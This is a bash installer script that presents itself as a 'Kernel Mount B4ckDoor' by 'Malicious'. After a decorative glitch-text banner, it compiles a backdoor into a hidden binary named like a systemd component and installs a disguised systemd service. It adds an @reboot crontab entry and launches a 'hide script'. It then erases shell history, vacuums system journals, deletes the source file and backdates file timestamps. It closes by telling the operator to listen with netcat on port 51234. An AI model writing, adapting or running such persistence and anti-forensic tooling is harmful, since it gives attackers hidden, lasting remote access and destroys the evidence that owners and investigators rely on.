#!/bin/bash

NEON_BLUE='\033[38;5;39m'
NEON_CYAN='\033[38;5;51m'
NEON_GREEN='\033[38;5;82m'
NEON_RED='\033[38;5;196m'
NEON_YELLOW='\033[38;5;190m'
NEON_PINK='\033[38;5;205m'
NEON_MAGENTA='\033[38;5;164m'
NEON_LIME='\033[38;5;118m'
NEON_GOLD='\033[38;5;214m'
NEON_PURPLE='\033[38;5;93m'
NEON_ORANGE='\033[38;5;208m'
NEON_WHITE='\033[38;5;231m'
BOLD='\033[1m'
NC='\033[0m'

ERROR_COUNT=0
STEP1_SUCCESS=0
STEP2_SUCCESS=0
STEP3_SUCCESS=0
STEP4_SUCCESS=0
STEP5_SUCCESS=0
STEP6_SUCCESS=0
STEP7_SUCCESS=0

glitch_text_center() {
local text="$1"
local glitch_color="$2"
local final_color="$3"
local delay="${4:-0.06}"
local term_width=$(tput cols 2>/dev/null || echo 80)
local text_len=${#text}
local padding=$(( (term_width - text_len) / 2 ))
if [[ $padding -lt 0 ]]; then
padding=0
fi
for i in {1..12}; do
local glitched=""
if [[ $((i % 2)) -eq 0 ]]; then
local color="${glitch_color}"
else
if [[ "$glitch_color" == "${NEON_RED}" ]]; then
local color="\033[38;5;160m"
elif [[ "$glitch_color" == "${NEON_CYAN}" ]]; then
local color="\033[38;5;50m"
elif [[ "$glitch_color" == "${NEON_PINK}" ]]; then
local color="\033[38;5;198m"
elif [[ "$glitch_color" == "${NEON_BLUE}" ]]; then
local color="\033[38;5;39m"
elif [[ "$glitch_color" == "${NEON_MAGENTA}" ]]; then
local color="\033[38;5;164m"
elif [[ "$glitch_color" == "${NEON_GREEN}" ]]; then
local color="\033[38;5;82m"
elif [[ "$glitch_color" == "${NEON_YELLOW}" ]]; then
local color="\033[38;5;190m"
else
local color="${glitch_color}"
fi
fi
for ((j=0; j<${#text}; j++)); do
if [[ $((RANDOM % 4)) -eq 0 ]] && [[ "${text:$j:1}" != " " ]]; then
local alt_chars=(
"$" "#" "@" "&" "%" "*" "+" "=" "?" "!" "~"
"Ҝ" "Ŧ" "Đ" "Å" "Ř" "Ʒ" "Ƹ" "ƹ" "ƺ" "ƻ"
)
glitched+="${alt_chars[$((RANDOM % ${#alt_chars[@]}))]}"
else
glitched+="${text:$j:1}"
fi
done
printf "\r%*s${BOLD}${color}%s${NC}" "$padding" "" "$glitched"
sleep 0.04
done
sleep 0.08
local typed=""
for ((i=0; i<${#text}; i++)); do
typed+="${text:$i:1}"
printf "\r%*s${BOLD}${final_color}%s${NC}" "$padding" "" "$typed"
sleep "$delay"
done
for i in {1..2}; do
if [[ $((i % 2)) -eq 0 ]]; then
printf "\r%*s${BOLD}${final_color}%s${NC}" "$padding" "" "$text"
else
printf "\r%*s${BOLD}${NEON_WHITE}%s${NC}" "$padding" "" "$text"
fi
sleep 0.06
done
printf "\r%*s${BOLD}${final_color}%s${NC}\n" "$padding" "" "$text"
sleep 0.08
}

scan_logo() {
local term_width=$(tput cols 2>/dev/null || echo 80)
local logo=(
"███╗   ███╗ █████╗ ██╗     ██╗ ██████╗██╗ ██████╗ ██╗   ██╗███████╗"
"████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔═══██╗██║   ██║██╔════╝"
"██╔████╔██║███████║██║     ██║██║     ██║██║   ██║██║   ██║███████╗"
"██║╚██╔╝██║██╔══██║██║     ██║██║     ██║██║   ██║██║   ██║╚════██║"
"██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╗██║╚██████╔╝╚██████╔╝███████║"
"╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝"
)
local max_len=0
for line in "${logo[@]}"; do
if [[ ${#line} -gt $max_len ]]; then
max_len=${#line}
fi
done
local padding=$(( (term_width - max_len) / 2 ))
if [[ $padding -lt 0 ]]; then
padding=0
fi
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[0]}"
sleep 0.05
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[1]}"
sleep 0.05
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[2]}"
sleep 0.05
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[3]}"
sleep 0.05
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[4]}"
sleep 0.05
printf "%*s${BOLD}${NEON_BLUE}%s${NC}\n" "$padding" "" "${logo[5]}"
sleep 0.05
}

show_header() {
clear
scan_logo
echo ""
sleep 0.1
glitch_text_center "Created by Malicious:" "${NEON_RED}" "${NEON_BLUE}" 0.03
sleep 0.2
glitch_text_center "Kernel Mount B4ckDoor" "${NEON_CYAN}" "${NEON_LIME}" 0.04
sleep 0.2
glitch_text_center "Telegram : @XCEE_H3R" "${NEON_MAGENTA}" "${NEON_GOLD}" 0.03
echo ""
}

check_file() {
if [ ! -f "$1" ]; then
echo -e "${BOLD}${NEON_RED}[!] File not found: $1${NC}"
return 1
fi
return 0
}

check_command() {
if ! command -v "$1" &> /dev/null; then
echo -e "${BOLD}${NEON_RED}[!] Command not found: $1${NC}"
return 1
fi
return 0
}

show_header

echo -e "${BOLD}${NEON_BLUE}[*] Updating and installing required packages...${NC}"
if apt-get update > /dev/null 2>&1 && \
   apt-get install -y gcc make build-essential > /dev/null 2>&1 && \
   apt-get install -y netcat-openbsd > /dev/null 2>&1 && \
   apt-get install -y curl wget > /dev/null 2>&1; then
    echo -e "${BOLD}${NEON_GREEN}[+] Updated and packages installed successfully!${NC}"
    STEP1_SUCCESS=1
else
    echo -e "${BOLD}${NEON_RED}[!] Failed to update or install packages!${NC}"
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 2: Compiling backdoor...${NC}"
if check_file "backdoor.c"; then
    if gcc -o /usr/local/bin/.systemd-resolved backdoor.c -Wall -O2 -ldl -pthread 2>/dev/null; then
        chmod 755 /usr/local/bin/.systemd-resolved 2>/dev/null
        chown root:root /usr/local/bin/.systemd-resolved 2>/dev/null
        echo -e "${BOLD}${NEON_GREEN}[+] Backdoor compiled successfully!${NC}"
        echo -e "${BOLD}${NEON_CYAN}-> Location: /usr/local/bin/.systemd-resolved${NC}"
        STEP2_SUCCESS=1
    else
        echo -e "${BOLD}${NEON_RED}[!] Compilation failed!${NC}"
        ERROR_COUNT=$((ERROR_COUNT + 1))
    fi
else
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 3: Moving files...${NC}"
MOVED=0
if check_file "System.service"; then
    if mv System.service /etc/systemd/system/ 2>/dev/null; then
        MOVED=$((MOVED + 1))
    else
        echo -e "${BOLD}${NEON_RED}[!] Failed to move System.service${NC}"
    fi
else
    echo -e "${BOLD}${NEON_RED}[!] System.service not found!${NC}"
fi

if check_file "systemd-linux"; then
    if mv systemd-linux /usr/local/bin/systemd-linux 2>/dev/null; then
        chmod +x /usr/local/bin/systemd-linux 2>/dev/null
        MOVED=$((MOVED + 1))
    else
        echo -e "${BOLD}${NEON_RED}[!] Failed to move systemd-linux${NC}"
    fi
else
    echo -e "${BOLD}${NEON_RED}[!] systemd-linux not found!${NC}"
fi

if [ $MOVED -eq 2 ]; then
    echo -e "${BOLD}${NEON_GREEN}[+] Files moved successfully!${NC}"
    echo -e "${BOLD}${NEON_CYAN}-> Service: /etc/systemd/system/System.service${NC}"
    echo -e "${BOLD}${NEON_CYAN}-> Script: /usr/local/bin/systemd-linux${NC}"
    STEP3_SUCCESS=1
else
    echo -e "${BOLD}${NEON_RED}[!] Some files failed to move!${NC}"
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 4: Enabling systemd service...${NC}"
if check_command "systemctl"; then
    systemctl daemon-reload 2>/dev/null
    systemctl enable System.service 2>/dev/null
    if systemctl start System.service 2>/dev/null; then
        echo -e "${BOLD}${NEON_GREEN}[+] Service enabled and started!${NC}"
        STATUS=$(systemctl is-active System.service 2>/dev/null)
        if [ "$STATUS" = "active" ]; then
            echo -e "${BOLD}${NEON_CYAN}-> Status: ${NEON_GREEN}active${NC}"
        else
            echo -e "${BOLD}${NEON_CYAN}-> Status: ${NEON_RED}${STATUS:-inactive}${NC}"
        fi
        STEP4_SUCCESS=1
    else
        echo -e "${BOLD}${NEON_RED}[!] Failed to start service!${NC}"
        ERROR_COUNT=$((ERROR_COUNT + 1))
    fi
else
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 5: Starting hide script...${NC}"
if [ -f "/usr/local/bin/systemd-linux" ]; then
    nohup /usr/local/bin/systemd-linux > /dev/null 2>&1 &
    PID=$(pgrep -f systemd-linux | head -1)
    if [ ! -z "$PID" ]; then
        echo -e "${BOLD}${NEON_GREEN}[+] Hide script running in background!${NC}"
        echo -e "${BOLD}${NEON_CYAN}-> PID: $PID${NC}"
        STEP5_SUCCESS=1
    else
        echo -e "${BOLD}${NEON_RED}[!] Failed to start hide script!${NC}"
        ERROR_COUNT=$((ERROR_COUNT + 1))
    fi
else
    echo -e "${BOLD}${NEON_RED}[!] /usr/local/bin/systemd-linux not found!${NC}"
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 6: Adding to crontab...${NC}"
if check_command "crontab"; then
    if (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/systemd-linux > /dev/null 2>&1 &") | crontab - 2>/dev/null; then
        echo -e "${BOLD}${NEON_GREEN}[+] Crontab entry added!${NC}"
        echo -e "${BOLD}${NEON_CYAN}-> @reboot /usr/local/bin/systemd-linux${NC}"
        STEP6_SUCCESS=1
    else
        echo -e "${BOLD}${NEON_RED}[!] Failed to add crontab entry!${NC}"
        ERROR_COUNT=$((ERROR_COUNT + 1))
    fi
else
    ERROR_COUNT=$((ERROR_COUNT + 1))
fi
echo ""

echo -e "${BOLD}${NEON_BLUE}[*] Step 7: Cleaning traces...${NC}"
history -c 2>/dev/null
if [ -f "$HOME/.bash_history" ]; then
    cat /dev/null > "$HOME/.bash_history" 2>/dev/null
else
    echo -e "${BOLD}${NEON_YELLOW}[-] ~/.bash_history not found${NC}"
fi

if [ -f "/root/.bash_history" ]; then
    cat /dev/null > /root/.bash_history 2>/dev/null
else
    echo -e "${BOLD}${NEON_YELLOW}[-] /root/.bash_history not found${NC}"
fi

if command -v journalctl &> /dev/null; then
    journalctl --rotate 2>/dev/null || echo -e "${BOLD}${NEON_YELLOW}[-] Failed to rotate journalctl${NC}"
    journalctl --vacuum-time=1s 2>/dev/null || echo -e "${BOLD}${NEON_YELLOW}[-] Failed to vacuum journalctl${NC}"
else
    echo -e "${BOLD}${NEON_YELLOW}[-] journalctl not available${NC}"
fi

if [ -f "backdoor.c" ]; then
    rm -f backdoor.c 2>/dev/null
fi

if [ -f "/usr/local/bin/.systemd-resolved" ]; then
    touch -t 202001011200 /usr/local/bin/.systemd-resolved 2>/dev/null || echo -e "${BOLD}${NEON_YELLOW}[-] Failed to set timestamp on .systemd-resolved${NC}"
else
    echo -e "${BOLD}${NEON_YELLOW}[-] /usr/local/bin/.systemd-resolved not found${NC}"
fi

if [ -f "/etc/systemd/system/System.service" ]; then
    touch -t 202001011200 /etc/systemd/system/System.service 2>/dev/null || echo -e "${BOLD}${NEON_YELLOW}[-] Failed to set timestamp on System.service${NC}"
else
    echo -e "${BOLD}${NEON_YELLOW}[-] /etc/systemd/system/System.service not found${NC}"
fi

if [ -f "/usr/local/bin/systemd-linux" ]; then
    touch -t 202001011200 /usr/local/bin/systemd-linux 2>/dev/null || echo -e "${BOLD}${NEON_YELLOW}[-] Failed to set timestamp on systemd-linux${NC}"
else
    echo -e "${BOLD}${NEON_YELLOW}[-] /usr/local/bin/systemd-linux not found${NC}"
fi

echo -e "${BOLD}${NEON_GREEN}[+] Traces cleaned!${NC}"
STEP7_SUCCESS=1
echo ""

echo -e "${BOLD}${NEON_PURPLE}==========================================${NC}"

TOTAL_SUCCESS=$((STEP1_SUCCESS + STEP2_SUCCESS + STEP3_SUCCESS + STEP4_SUCCESS + STEP5_SUCCESS + STEP6_SUCCESS + STEP7_SUCCESS))
if [ $TOTAL_SUCCESS -ge 5 ]; then
    echo -e "${BOLD}${NEON_GREEN}[+] ALL STEPS COMPLETED SUCCESSFULLY!${NC}"
    echo -e "${BOLD}${NEON_CYAN}-> Backdoor is running and hidden${NC}"
    echo -e "${BOLD}${NEON_PINK}-> Connect with: nc -lvnp 51234${NC}"
    echo -e "${BOLD}${NEON_ORANGE}[+] System ready for connection!${NC}"
else
    echo -e "${BOLD}${NEON_RED}[!] SETUP FAILED!${NC}"
    echo -e "${BOLD}${NEON_RED}[!] $ERROR_COUNT errors occurred during installation!${NC}"
    echo -e "${BOLD}${NEON_CYAN}-> Please check the errors above and fix them manually.${NC}"
fi
echo -e "${BOLD}${NEON_PURPLE}==========================================${NC}"
